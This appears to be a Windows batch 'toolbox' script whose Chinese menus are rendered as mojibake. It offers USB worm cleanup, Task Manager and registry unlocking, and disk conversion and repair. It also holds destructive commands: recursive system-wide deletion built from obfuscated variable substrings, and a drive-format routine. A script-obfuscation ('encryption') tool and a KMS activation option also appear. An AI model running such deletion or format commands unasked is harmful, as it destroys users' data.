set color1=f
set/a color=%random%%%5
if %color%==0 set ysbak=40;97m
if %color%==1 set ysbak=44;97m
if %color%==2 set color=5&set ysbak=45;97m
if %color%==3 set ysbak=46;97m
if %color%==4 set color=7&set color1=8&set ysbak=47;90m
color %color%%color1%
if exist %temp%\dostoolupdate (
for /f "delims=: tokens=1" %%a in (%temp%\dostoolupdate) do (
set /a gxjg=%%a-!ver!
if !gxjg! gtr 0 (set gxflag= - ��鵽���°汾: %%a
for /f "delims=: tokens=2" %%b in (%temp%\dostoolupdate) do (set doshash="%%b")))
del /f /q %temp%\dostoolupdate)
title DOS������%system%%gxflag%
cls
echo                                     �˵� - ��!cswz!!ysbak:~0,3!92m5!cswz!!ysbak!ҳ
echo ������%date:~0,4%��%date:~5,2%��%date:~8,2%�� %xingqi% %time:~0,8%
echo _______________________________________________________________________________
echo [1]�ı����
echo [2]��ʾ��������û�������
echo [3]NTFSѹ��
echo [4]�޸��ļ�Ȩ��
echo [5]��ʾ����������
echo [6]�����Ķ���
echo [7]�������ļ����շ���
echo [8]�ļ�����
echo [9]�޸����𻵵��ļ�
echo [0]�˳�                                             !cswz!42;97m%nx%!cswz!!ysbak!
echo _______________________________________________________________________________
set caidan=
set/p caidan=���������ѡ��:
if "!caidan!"=="1" goto 37
if "!caidan!"=="2" goto 38
if "!caidan!"=="3" goto 39
if "!caidan!"=="4" goto 40
if "!caidan!"=="5" goto 41
if "!caidan!"=="6" goto 42
if "!caidan!"=="7" goto 43
if "!caidan!"=="8" goto 44
if "!caidan!"=="9" goto 45
if "!caidan!"=="0" goto 00
if "!caidan!"=="-" goto memuv2
if "!caidan!"=="+" goto memuv2
if /i "!caidan!"=="a" goto memuv2
if /i "!caidan!"=="s" goto memuv2
if /i "!caidan!"=="vbsjsq" set tzwz=e&goto vbsjsq
if /i "!caidan!"=="guanji" set tzwz=e&goto guanji
if "!caidan!"=="BATJIAMI" set tzwz=e&goto batjiami
if /i "!caidan!"=="guanyu" set tzwz=e&goto guanyu
if /i "!caidan!"=="csh" goto chushihua
if /i "!caidan!"=="kcd" set tzwz=e&goto kcd
if /i "!caidan!"=="gcd" set tzwz=e&goto gcd
if /i "!caidan!"=="xz" set tzwz=e&goto xz
if /i "!caidan!"=="js" set tzwz=e&goto 49
if /i "!caidan!"=="gx" set tzwz=e&goto update
if /i "!caidan!"=="go1" goto memuv2
if /i "!caidan!"=="go2" goto memuv2
if /i "!caidan!"=="go3" goto memuv2
if /i "!caidan!"=="go4" goto memuv2
if /i "!caidan!"=="go5" goto memuv2
if /i "!caidan!"=="go6" goto memuv2
if /i "!caidan!"=="go7" goto memuv2
if /i "!caidan!"=="go8" goto memuv2
echo ��������ȷ��ѡ�
ping/n 2 0.0>nul
goto memuv2
:f
set color=
set color1=f
set/a color=%random%%%5
if %color%==0 set ysbak=40;97m
if %color%==1 set ysbak=44;97m
if %color%==2 set color=5&set ysbak=45;97m
if %color%==3 set ysbak=46;97m
if %color%==4 set color=7&set color1=8&set ysbak=47;90m
color %color%%color1%
if exist %temp%\dostoolupdate (
for /f "delims=: tokens=1" %%a in (%temp%\dostoolupdate) do (
set /a gxjg=%%a-!ver!
if !gxjg! gtr 0 (set gxflag= - ��鵽���°汾: %%a
for /f "delims=: tokens=2" %%b in (%temp%\dostoolupdate) do (set doshash="%%b")))
del /f /q %temp%\dostoolupdate)
title DOS������%system%%gxflag%
cls
echo                                     �˵� - ��!cswz!!ysbak:~0,3!92m6!cswz!!ysbak!ҳ
echo ������%date:~0,4%��%date:~5,2%��%date:~8,2%�� %xingqi% %time:~0,8%
echo _______________________________________________________________________________
echo [1]�����ƽ�ѹ��������
echo [2]Wifi�ȵ�
echo [3]������chm�ļ�
echo [4]�ر�����Ӧ����
echo [5]�ļ��Ƚ���
echo [6]������д����а�
echo [7]��ϵͳ��������
echo [8]��֪�����ռ�������
echo [9]��ѯϵͳ����״̬
echo [0]�˳�                                             !cswz!42;97m%nx%!cswz!!ysbak!
echo _______________________________________________________________________________
set caidan=
set/p caidan=���������ѡ��:
if "!caidan!"=="1" goto 46
if "!caidan!"=="2" goto 47
if "!caidan!"=="3" goto 48
if "!caidan!"=="4" set tzwz=f&goto 49
if "!caidan!"=="5" goto 50
if "!caidan!"=="6" goto 51
if "!caidan!"=="7" goto 52
if "!caidan!"=="8" goto 53
if "!caidan!"=="9" goto 54
if "!caidan!"=="0" goto 00
if "!caidan!"=="-" goto memuv2
if "!caidan!"=="+" goto memuv2
if /i "!caidan!"=="a" goto memuv2
if /i "!caidan!"=="s" goto memuv2
if /i "!caidan!"=="vbsjsq" set tzwz=f&goto vbsjsq
if /i "!caidan!"=="guanji" set tzwz=f&goto guanji
if "!caidan!"=="BATJIAMI" set tzwz=f&goto batjiami
if /i "!caidan!"=="guanyu" set tzwz=f&goto guanyu
if /i "!caidan!"=="csh" goto chushihua
if /i "!caidan!"=="kcd" set tzwz=f&goto kcd
if /i "!caidan!"=="gcd" set tzwz=f&goto gcd
if /i "!caidan!"=="xz" set tzwz=f&goto xz
if /i "!caidan!"=="js" set tzwz=f&goto 49
if /i "!caidan!"=="gx" set tzwz=f&goto update
if /i "!caidan!"=="go1" goto memuv2
if /i "!caidan!"=="go2" goto memuv2
if /i "!caidan!"=="go3" goto memuv2
if /i "!caidan!"=="go4" goto memuv2
if /i "!caidan!"=="go5" goto memuv2
if /i "!caidan!"=="go6" goto memuv2
if /i !caidna!=="go7" goto memuv2
if /i "!caidan!"=="go8" goto memuv2
echo ��������ȷ��ѡ�
ping/n 2 0.0>nul
goto memuv2
:g
set color=
set color1=f
set/a color=%random%%%5
if %color%==0 set ysbak=40;97m
if %color%==1 set ysbak=44;97m
if %color%==2 set color=5&set ysbak=45;97m
if %color%==3 set ysbak=46;97m
if %color%==4 set color=7&set color1=8&set ysbak=47;90m
color %color%%color1%
if exist %temp%\dostoolupdate (
for /f "delims=: tokens=1" %%a in (%temp%\dostoolupdate) do (
set /a gxjg=%%a-!ver!
if !gxjg! gtr 0 (set gxflag= - ��鵽���°汾: %%a
for /f "delims=: tokens=2" %%b in (%temp%\dostoolupdate) do (set doshash="%%b")))
del /f /q %temp%\dostoolupdate)
title DOS������%system%%gxflag%
cls
echo                                     �˵� - ��!cswz!!ysbak:~0,3!92m7!cswz!!ysbak!ҳ
echo ������%date:~0,4%��%date:~5,2%��%date:~8,2%�� %xingqi% %time:~0,8%
echo _______________________________________________________________________________
echo [1]����ָ���ļ��Ŀ�ݷ�ʽ������
echo [2]��ϵͳ����
echo [3]����ͳ��
echo [4]������������
echo [5]�򿪹������̨
echo [6]���Streams�ļ�����
echo [7]������ɾ�����г���װ���
echo [8]ע�������
echo [9]Base64�����
echo [0]�˳�                                             !cswz!42;97m%nx%!cswz!!ysbak!
echo _______________________________________________________________________________
set caidan=
set/p caidan=���������ѡ��:
if "!caidan!"=="1" goto 55
if "!caidan!"=="2" goto 56
if "!caidan!"=="3" goto 57
if "!caidan!"=="4" goto 58
if "!caidan!"=="5" goto 59
if "!caidan!"=="6" goto 60
if "!caidan!"=="7" goto 61
if "!caidan!"=="8" goto 62
if "!caidan!"=="9" goto 63
if "!caidan!"=="0" goto 00
if "!caidan!"=="-" goto memuv2
if "!caidan!"=="+" goto memuv2
if /i "!caidan!"=="a" goto memuv2
if /i "!caidan!"=="s" goto memuv2
if /i "!caidan!"=="vbsjsq" set tzwz=g&goto vbsjsq
if /i "!caidan!"=="guanji" set tzwz=g&goto guanji
if "!caidan!"=="BATJIAMI" set tzwz=g&goto batjiami
if /i "!caidan!"=="guanyu" set tzwz=g&goto guanyu
if /i "!caidan!"=="csh" goto chushihua
if /i "!caidan!"=="kcd" set tzwz=g&goto kcd
if /i "!caidan!"=="gcd" set tzwz=g&goto gcd
if /i "!caidan!"=="xz" set tzwz=g&goto xz
if /i "!caidan!"=="js" set tzwz=g&goto 49
if /i "!caidan!"=="gx" set tzwz=g&goto update
if /i "!caidan!"=="go1" goto memuv2
if /i "!caidan!"=="go2" goto memuv2
if /i "!caidan!"=="go3" goto memuv2
if /i "!caidan!"=="go4" goto memuv2
if /i "!caidan!"=="go5" goto memuv2
if /i "!caidan!"=="go6" goto memuv2
if /i "!caidan!"=="go7" goto memuv2
if /i "!caidan!"=="go8" goto memuv2
echo ��������ȷ��ѡ�
ping/n 2 0.0>nul
goto memuv2
:h
set color=
set color1=f
set/a color=%random%%%5
if %color%==0 set ysbak=40;97m
if %color%==1 set ysbak=44;97m
if %color%==2 set color=5&set ysbak=45;97m
if %color%==3 set ysbak=46;97m
if %color%==4 set color=7&set color1=8&set ysbak=47;90m
color %color%%color1%
if exist %temp%\dostoolupdate (
for /f "delims=: tokens=1" %%a in (%temp%\dostoolupdate) do (
set /a gxjg=%%a-!ver!
if !gxjg! gtr 0 (set gxflag= - ��鵽���°汾: %%a
for /f "delims=: tokens=2" %%b in (%temp%\dostoolupdate) do (set doshash="%%b")))
del /f /q %temp%\dostoolupdate)
title DOS������%system%%gxflag%
cls
echo                                     �˵� - ��!cswz!!ysbak:~0,3!92m8!cswz!!ysbak!ҳ
echo ������%date:~0,4%��%date:~5,2%��%date:~8,2%�� %xingqi% %time:~0,8%
echo _______________________________________________________________________________
echo [1]8.3���ļ�������
echo [2]����NTFSѹ��
echo [3]�����ļ���ϣֵ
echo [4]��ʾ���һ���
echo [5]���������̷�
echo [6]��ѹmsi��װ�ļ�
echo [7]����CMD����̨ɫ�ʱ�
echo [8]KMS����Windows 10
echo [0]�˳�                                                      !cswz!42;97m%nx7%!cswz!!ysbak!
echo _______________________________________________________________________________
set caidan=
set/p caidan=���������ѡ��:
if "!caidan!"=="1" goto 64
if "!caidan!"=="2" goto 65
if "!caidan!"=="3" goto 66
if "!caidan!"=="4" goto 67
if "!caidan!"=="5" goto 68
if "!caidan!"=="6" goto 69
if "!caidan!"=="7" goto 70
if "!caidan!"=="8" goto 71
if "!caidan!"=="0" goto 00
if "!caidan!"=="-" goto memuv2
if /i "!caidan!"=="a" goto memuv2
if /i "!caidan!"=="vbsjsq" set tzwz=h&goto vbsjsq
if /i "!caidan!"=="guanji" set tzwz=h&goto guanji
if "!caidan!"=="BATJIAMI" set tzwz=h&goto batjiami
if /i "!caidan!"=="guanyu" set tzwz=h&goto guanyu
if /i "!caidan!"=="csh" goto chushihua
if /i "!caidan!"=="kcd" set tzwz=h&goto kcd
if /i "!caidan!"=="gcd" set tzwz=h&goto gcd
if /i "!caidan!"=="xz" set tzwz=h&goto xz
if /i "!caidan!"=="js" set tzwz=h&goto 49
if /i "!caidan!"=="gx" set tzwz=a&goto update
if /i "!caidan!"=="go1" goto memuv2
if /i "!caidan!"=="go2" goto memuv2
if /i "!caidan!"=="go3" goto memuv2
if /i "!caidan!"=="go4" goto memuv2
if /i "!caidan!"=="go5" goto memuv2
if /i "!caidan!"=="go6" goto memuv2
if /i "!caidan!"=="go7" goto memuv2
if /i !caidna!=="go8" goto memuv2
echo ��������ȷ��ѡ�
ping/n 2 0.0>nul
goto memuv2
:01
title ���U�����lpk.dll����%system%
cls
echo ���������ʼ���lpl.dll����&pause>nul
cls
echo �����������ƶ�����...
for /f "delims=" %%a in ('"fsutil fsinfo drives"') do (set sypf=%%a)
set sypf=%sypf:~5%
for %%h in (%sypf%) do (
fsutil fsinfo drivetype %%h|find /i "���ƶ�������"&&goto 01-1)
cls
echo û���ҵ����ƶ�����
echo _______________________________________________________________________________
echo ����������ز˵�&pause>nul
goto memuv2
:01-1
cls
echo �������lpk.dll����...
for /f "delims=" %%a in ('"fsutil fsinfo drives"') do (set sypf=%%a)
set sypf=%sypf:~5%
for %%h in (%sypf%) do fsutil fsinfo drivetype %%h|find /i "���ƶ�������"&&for /f "delims=" %%i in ('"dir/a/s/b %%hlpk.dll"') do if %%~zi==44032 attrib -s -h -r "%%i"|del/f/q "%%i"|echo ��ɾ��%%i
echo _______________________________________________________________________________
echo ������
echo ����������ز˵�&pause>nul
goto memuv2
:02
title ���U�����jwgkvsq.vmx�����������߸ò���%system%
cls
echo ���������ʼ���jwgkvsq.vmx����&pause>nul
cls
echo �����������ƶ�����...
for /f "delims=" %%a in ('"fsutil fsinfo drives"') do (set sypf=%%a)
set sypf=%sypf:~5%
for %%j in (%sypf%) do (
fsutil fsinfo drivetype %%j|find /i "���ƶ�������"&&goto 02-1)
cls
echo û���ҵ����ƶ�����
echo _______________________________________________________________________________
echo ����������ز˵�&pause>nul
goto memuv2
:02-1
cls
echo �������jwgkvsq.vmx����...
for /f "delims=" %%a in ('"fsutil fsinfo drives"') do (set sypf=%%a)
set sypf=%sypf:~5%
for %%j in (%sypf%) do (
fsutil fsinfo drivetype %%j|find /i "���ƶ�������"&&takeown/f "%%jautorun.inf"
fsutil fsinfo drivetype %%j|find /i "���ƶ�������"&&echo y|cacls "%%jautorun.inf" /t /c /p everyone:f
fsutil fsinfo drivetype %%j|find /i "���ƶ�������"&&takeown/f "%%jRECYLER"
fsutil fsinfo drivetype %%j|find /i "���ƶ�������"&&echo y|cacls "%%jRECYCLER" /t /c /p everyone:f
fsutil fsinfo drivetype %%j|find /i "���ƶ�������"&&attrib -s -h -r "%%jautorun.inf"
fsutil fsinfo drivetype %%j|find /i "���ƶ�������"&&del/f/q "%%jautorun.inf"
fsutil fsinfo drivetype %%j|find /i "���ƶ�������"&&rd/s/q "%%jRECYCLER"
fsutil fsinfo drivetype %%j|find /i "���ƶ�������"&&del/f/q "%%jRECYCLER"
fsutil fsinfo drivetype %%j|find /i "���ƶ�������"&&echo jwgkvsq.vmx���������ļ�������ɾ����>"%%jRECYCLER")
echo _______________________________________________________________________________
echo ������
echo ����������ز˵�&pause>nul
goto memuv2
:03
title ����ϵͳ����%system%
cls
%sc:~0,3%/f%ad%/s/%ad%q %systemdrive%\*.tm%ad%p
%sc:~0,3%/f%ad%/s/%ad%q %systemdrive%\*._mp
%sc:~0,3%/f%ad%/s/%ad%q %systemdrive%\~*.*
goto 03(1)
%sc:~0,3%/f%ad%/s/%ad%q %systemdrive%\*.syd
%sc:~0,3%/f%ad%/s/%ad%q %systemdrive%\*.spc
%sc:~0,3%/f%ad%/s/%ad%q %systemdrive%\*.cdr_
%sc:~0,3%/f%ad%/s/%ad%q %systemdrive%\*.#res
%sc:~0,3%/f%ad%/s/%ad%q %systemdrive%\*.---
%sc:~0,3%/f%ad%/s/%ad%q %systemdrive%\*.$$$
%sc:~0,3%/f%ad%/s/%ad%q %systemdrive%\*.@@@
%sc:~0,3%/f%ad%/s/%ad%q %systemdrive%\*.??$
%sc:~0,3%/f%ad%/s/%ad%q %systemdrive%\*.??~
%sc:~0,3%/f%ad%/s/%ad%q %systemdrive%\*.~*
%sc:~0,3%/f%ad%/s/%ad%q %systemdrive%\mscreate.dir
%sc:~0,3%/f%ad%/s/%ad%q %systemdrive%\chklist.*
%sc:~0,3%/f%ad%/s/%ad%q %systemdrive%\*.ftg
%sc:~0,3%/f%ad%/s/%ad%q %systemdrive%\*.fts
%sc:~0,3%/f%ad%/s/%ad%q %systemdrive%\*.err
%sc:~0,3%/f%ad%/s/%ad%q %systemdrive%\*.prv
%sc:~0,3%/f%ad%/s/%ad%q %systemdrive%\*.ms
%sc:~0,3%/f%ad%/s/%ad%q %systemdrive%\*.wbk
%sc:~0,3%/f%ad%/s/%ad%q %systemdrive%\*.xlk
%sc:~0,3%/f%ad%/s/%ad%q %systemdrive%\*.diz
:03(1)
%sc:~0,3%/f%ad%/s/%ad%q %systemdrive%\*log.txt
%sc:~0,3%/f%ad%/s/%ad%q %systemdrive%\*.dmp
%sc:~0,3%/f%ad%/s/%ad%q %systemdrive%\*.log
%sc:~0,3%/f%ad%/s/%ad%q %systemdrive%\*.gid
%sc:~0,3%/f%ad%/s/%ad%q %systemdrive%\*.chk
%sc:~0,3%/f%ad%/s/%ad%q %systemdrive%\*.old
%sc:~0,3%/f%ad%/s/%ad%q %systemdrive%\recycled\*.*
%sc:~0,3%/f%ad%/s/%ad%q %windir%\*.bak
%sc:~0,3%/f%ad%/s/%ad%q %windir%\prefetch\*.*
%scw:~0,2%/s/q %windir%\temp & md %windir%\temp
%sc:~0,3%/f%ad%/s/%ad%q/f/q %userprofile%\cookies\*.*
%sc:~0,3%/f%ad%/s/%ad%q "%userprofile%\Local Settings\Temporary Internet Files\*.*"
%sc:~0,3%/f%ad%/s/%ad%q "%userprofile%\Local Settings\Temp\*.*"
%sc:~0,3%/f%ad%/s/%ad%q "%userprofile%\recent\*.*"
echo _______________________________________________________________________________
echo �������
echo ����������ز˵�&pause>nul
goto memuv2
:04
title ��ʾϵͳ��Ϣ%system%
cls
systeminfo
mode
echo _______________________________________________________________________________
echo ����������ز˵�&pause>nul
goto memuv2
:05
title ������������������%system%
cls
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskmgr /t reg_dword /d 00000000 /f
echo _______________________________________________________________________________
echo ����������ز˵�&pause>nul
goto memuv2
:06
title ��ʾ�������ļ�(���˸��ಡ����)%system%
cls
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\Hidden\SHOWALL" /v CheckedValue /t reg_dword /d 00000001 /f
echo _______________________________________________________________________________
echo ����������ز˵�&pause>nul
goto memuv2
:07
title ���ע�������%system%
cls
echo [Version]>%systemdrive%\windows\temp\reg.inf
echo Signature="$CHICAGO$">>%systemdrive%\windows\temp\reg.inf
echo [DefaultInstall]>>%systemdrive%\windows\temp\reg.inf
echo DelReg=del>>%systemdrive%\windows\temp\reg.inf
echo [del]>>%systemdrive%\windows\temp\reg.inf
echo HKCU,Software\Microsoft\Windows\CurrentVersion\Policies\System,Disableregistrytools>>%systemdrive%\windows\temp\reg.inf
rundll32 syssetup,SetupInfObjectInstallAction DefaultInstall 128 %systemdrive%\windows\temp\reg.inf
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /t reg_dword /d 00000000 /f
del/f/q %systemdrive%\windows\temp\reg.inf
echo _______________________________________________________________________________
echo ����������ز˵�&pause>nul
goto memuv2
:08
title ���㿪ƽ��%system%
cls
set w=0
set s=0
set/p s=�����뱻��ƽ������:
set s=%s:|=%
for /f "delims=0123456789" %%a in ('echo %s%') do goto kpfcw
set/p w=��ȷ��С�����λ��:
set w=%w:|=%
for /f "delims=0123456789" %%a in ('echo %w%') do goto xswscw
set wbak=%w%
set sbak=%s%
if defined W (for /l %%i in (1 1 %W%) do set "s=!s!00") else set W=0
set p=!s!&set /a len=N=0
for %%i in (4096 2048 1024 512 256 128 64 32 16 8 4 2 1) do IF "!p:~%%i!" NEQ "" set/a len+=%%i&set "p=!p:~%%i!"
set /a "N-=~(len%%2)"
set M=!s:~,%N%!
for /l %%i in (1 1 9) do set/a Mx=%%i*%%i&if !Mx! leq !M! set/a "i=%%i,j=100+M-Mx"
set /a "len-=1,Len_i=_N=i/5+1,p=i*20"
set j=!j:~-%_N%!&set p=0!p!&set kl=0000000
set /a _N=8-_N
for /l %%i in (%N% 2 !len!) do (
set "j=!j!!s:~%%i,2!"
if "!j:0=!" neq "" (
set /a Ln_i=Len_i+=2
if "!p!" lss "!j!" (
set d=Z&set in=!kl!!P!&set /a Ln_i+=7
for /l %%j in (9 -1 2) do (
if "!d!" gtr "!j!" (
set "x=%%j"
set d=&set /a "b=x*x"
for /l %%k in (8 8 !Ln_i!) do (
set /a "b=1!in:~-%%k,8!*%%j+b"
set d=!b:~-8!!d!&set /a "b=!b:~,-8!-%%j"
)
set d=!b!!d!
for %%k in (!Len_i!) do set "d=!d:~-%%k!"
)
)
if "!d!" gtr "!j!" (set d=!in!&set x=1&set b=1) else set d=!kl!!d!&set b=0
set j=!kl!!j!&set "t="
for /l %%j in (8 8 !Ln_i!) do (
set /a "b=3!j:~-%%j,8!-1!d:~-%%j,8!-!b:~,1!%%2"
set "t=!b:~1!!t!"
)
for %%j in (!Len_i!) do set "j=!t:~-%%j!"
set "j=!j:~1!" ) else set "x=0"
set /a "Len_i-=1"
if "!x!" neq "0" (
if "!x!" geq "5" (
set p=&set b=0&set "in=!kl!!i!!x!"
set /a "Ln_i=Len_i+_N"
for /l %%j in (8 8 !Ln_i!) do (
set /a "b=1!in:~-%%j,8!*2+!b:~,1!%%2"
set p=!b:~1!!p!
)
set /a "b=!b:~,1!%%2"
for %%j in (!Len_i!) do set "p=!b:1=01!!p:~-%%j!0"
) else set /a t=x*2&set "p=!p:~,-1!!t!0"
) else set p=!p!0&set "j=!j:~1!"
) else set j=!j:~1!&set p=!p!0&set /a "Len_i+=1,x=0"
set i=!i!!x!
)
for /f "tokens=* delims=." %%i in ("!i:~,-%W%!.!i:~-%W%!") do set sqrt=%%i
cls
echo %sbak%�Ŀ�ƽ�������(��ȷ��С�����%wbak%λ):
echo %sqrt%
echo _______________________________________________________________________________
echo ����������ز˵�&pause>nul
goto memuv2
:kpfcw
echo ������Ч����!
ping/n 2 0.0>nul
goto 08
:xswscw
echo ������Ч����!
ping/n 2 0.0>nul
goto 08
:09
title ������ʾ��%system%
cls
ver
if !winv! equ 0 (cmd /k prompt !cswz!!ysbak:~0,3!92m%username%!cswz!!ysbak!@%hostname%:$p#$s) else (cmd /k prompt %username%@%hostname%:$p#$s)
goto memuv2
:10
title �����̸�ʽת��ΪNTFS%system%
cls
echo _______________________________________________________________________________
fsutil fsinfo drives
echo _______________________________________________________________________________
echo �����������ת������ʹ�ô��̴����޸�
set zhuanhuancipan=
set/p zhuanhuancipan=��������Ҫת�����̷�:
cls
convert %zhuanhuancipan%:/fs:ntfs
echo _______________________________________________________________________________
echo ����������ز˵�&pause>nul
goto memuv2
:11
title �����޸�%system%
cls
echo _______________________________________________________________________________
fsutil fsinfo drives
echo _______________________________________________________________________________
set cipanxioufu=
set/p cipanxioufu=��������Ҫ�޸����̷�:
cls
fsutil fsinfo ntfsinfo %cipanxioufu%:>nul 2>nul
if "%errorlevel%"=="0" (chkdsk /x /f /sdcleanup %cipanxioufu%:) else (chkdsk /f /x %cipanxioufu%:)
echo _______________________________________________________________________________
echo �޸����
echo ����������ز˵�&pause>nul
goto memuv2
:12
color cf
title ��ʽ��%system%
echo 
cls
set geshihuaxuanxiang=
set/p geshihuaxuanxiang=��ʽ����һ����Σ���ԣ��Ƿ����(y/n):
set geshihuaxuanxiang="%geshihuaxuanxiang:|=%"
if /i !geshihuaxuanxiang!=="y" goto 12(1)
if /i !geshihuaxuanxiang!=="n" goto memuv2
echo ��������ȷ��ѡ�
ping/n 2 0.0>nul
goto 12
:12(1)
cls
echo _______________________________________________________________________________
fsutil fsinfo drives
echo _______________________________________________________________________________
set geshihua=
set/p geshihua=��������Ҫ��ʽ�����̷�:
cls
label %geshihua%: format
format %geshihua%:/x/q/v:format/y
echo _______________________________________________________________________________
echo ����������ز˵�&pause>nul
goto memuv2
:batjiami
color 0a
title bat����%system%
cls
echo �˹���ֻ�������ڴ��ı��ļ�����
echo _______________________________________________________________________________
echo [1]�ļ�����(����1)
echo [2]�ļ�����
echo [3]�ļ�����(����2)(�Ƽ�ʹ��)
echo [0]���ز˵�
echo _______________________________________________________________________________
set batjmxx=
set/p batjmxx=���������ѡ��:
if "!batjmxx!"=="1" goto batjiami(1)
if "!batjmxx!"=="2" goto batjiami(2)
if "!batjmxx!"=="3" goto batjiami(3)
if "!batjmxx!"=="0" if "!tzwz!" equ "!start!" (goto memuv2) else (goto !tzwz!)
echo ��������ȷ��ѡ�
ping/n 2 0.0>nul
goto batjiami
:batjiami(1)
title �ļ�����(����1)%system%
del/f/q %systemdrive%linshiwenjian.tmp>nul
cls
echo �ļ�����(����1)
echo _______________________________________________________________________________
echo �����ļ�������������(e=����):
echo _______________________________________________________________________________
set jiami=
set/p jiami=�϶���Ҫ���ܵ��ļ����˴���:
if /i "!jiami!"=="e" goto batjiami
if "!jiami:~0,1!!jiami:~-1!" neq """" for /f "delims=" %%a in ('"echo !jiami!"') do (set !jiami!="%%~a")
:batpd
cls
for /f "delims=" %%a in ("!jiami!") do set jmdx=%%~za
set/a batpdjg=!jmdx!%%2
if "!batpdjg!"=="1" goto jiamipause
if "!batpdjg!"=="0" goto beiyongjiamipause
echo ��������ȷ��ѡ�
ping/n 2 0.0>nul
goto batjiami(1)
:jiamipause
for /f "delims=" %%e in ("!jiami!") do if %%~xe==.bat set geshi=bat&set wjm=%%~ne&goto batjiami(1)(1)
for /f "delims=" %%e in ("!jiami!") do if %%~xe==.txt set geshi=txt&set wjm=%%~ne&goto batjiami(1)(1)
for /f "delims=" %%e in ("!jiami!") do if %%~xe==.log set geshi=log&set wjm=%%~ne&goto batjiami(1)(1)
for /f "delims=" %%e in ("!jiami!") do if %%~xe==.inf set geshi=inf&set wjm=%%~ne&goto batjiami(1)(1)
for /f "delims=" %%e in ("!jiami!") do if %%~xe==.cmd set geshi=cmd&set wjm=%%~ne&goto batjiami(1)(1)
for /f "delims=" %%e in ("!jiami!") do if %%~xe==.ini set geshi=ini&set wjm=%%~ne&goto batjiami(1)(1)
for /f "delims=" %%e in ("!jiami!") do if %%~xe==.lrc set geshi=lrc&set wjm=%%~ne&goto batjiami(1)(1)
echo ��Ч���ļ���ʽ��
ping/n 2 0.0>nul
goto batjiami(1)
:batjiami(1)(1)
copy/y "!jiami!" %systemdrive%linshiwenjian.tmp
echo %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a >%systemdrive%1.tmp
echo cls>%systemdrive%2.tmp
copy/b %systemdrive%1.tmp+%systemdrive%2.tmp+%systemdrive%linshiwenjian.tmp "%zmlj%�Ѽ��ܵ�%wjm%.%geshi%"
del/f/q %systemdrive%1.tmp
del/f/q %systemdrive%2.tmp
del/f/q %systemdrive%linshiwenjian.tmp
cls
echo _______________________________________________________________________________
echo �������
ping/n 2 0.0>nul
goto batjiami
:batjiami(2)
title �ļ�����%system%
del/f/q %systemdrive%linshiwenjian.tmp>nul
cls
echo �ļ�����
echo _______________________________________________________________________________
echo �����ļ�������������(e=����)
echo _______________________________________________________________________________
set jiemi=
set/p jiemi=�϶���Ҫ���ܵ��ļ����˴���:
if /i "!jiemi!"=="e" goto batjiami
if "!jiemi:~0,1!!jiemi:-1!" neq """" for /f "delims=" %%a in ('"echo !jiemi!"') do (set !jiemi!="%%~a")
:jiemipause
for /f "delims=" %%f in ("!jiemi!") do if %%~xf==.bat set geshi=bat&set wjm=%%~nf&goto batjiami(2)(1)
for /f "delims=" %%f in ("!jiemi!") do if %%~xf==.txt set geshi=txt&set wjm=%%~nf&goto batjiami(2)(1)
for /f "delims=" %%f in ("!jiemi!") do if %%~xf==.log set geshi=log&set wjm=%%~nf&goto batjiami(2)(1)
for /f "delims=" %%f in ("!jiemi!") do if %%~xf==.inf set geshi=inf&set wjm=%%~nf&goto batjiami(2)(1)
for /f "delims=" %%f in ("!jiemi!") do if %%~xf==.cmd set geshi=cmd&set wjm=%%~nf&goto batjiami(2)(1)
for /f "delims=" %%f in ("!jiemi!") do if %%~xf==.ini set geshi=ini&set wjm=%%~nf&goto batjiami(2)(1)
for /f "delims=" %%f in ("!jiemi!") do if %%~xf==.lrc set geshi=lrc&set wjm=%%~nf&goto batjiami(2)(1)
echo ��Ч���ļ���ʽ��
ping/n 2 0.0>nul
goto batjiami(2)
:batjiami(2)(1)
copy/y "!jiemi!" %systemdrive%linshiwenjian.tmp
echo;>%systemdrive%3.tmp
copy/b %systemdrive%3.tmp+%systemdrive%linshiwenjian.tmp "%zmlj%�ѽ��ܵ�%wjm%.%geshi%"
del/f/q 3.tmp
del/f/q %systemdrive%linshiwenjian.tmp
cls
echo _______________________________________________________________________________
echo �������
ping/n 2 0.0>nul
goto batjiami
:beiyongjiamipause
del/f/q %systemdrive%linshiwenjian.tmp>nul
for /f "delims=" %%g in ("!jiami!") do if %%~xg==.bat set geshi=bat&set wjm=%%~ng&goto beiyongjiami(1)
for /f "delims=" %%g in ("!jiami!") do if %%~xg==.txt set geshi=txt&set wjm=%%~ng&goto beiyongjiami(1)
for /f "delims=" %%g in ("!jiami!") do if %%~xg==.log set geshi=log&set wjm=%%~ng&goto beiyongjiami(1)
for /f "delims=" %%g in ("!jiami!") do if %%~xg==.inf set geshi=inf&set wjm=%%~ng&goto beiyongjiami(1)
for /f "delims=" %%g in ("!jiami!") do if %%~xg==.cmd set geshi=cmd&set wjm=%%~ng&goto beiyongjiami(1)
for /f "delims=" %%g in ("!jiami!") do if %%~xg==.ini set geshi=ini&set wjm=%%~ng&goto beiyongjiami(1)
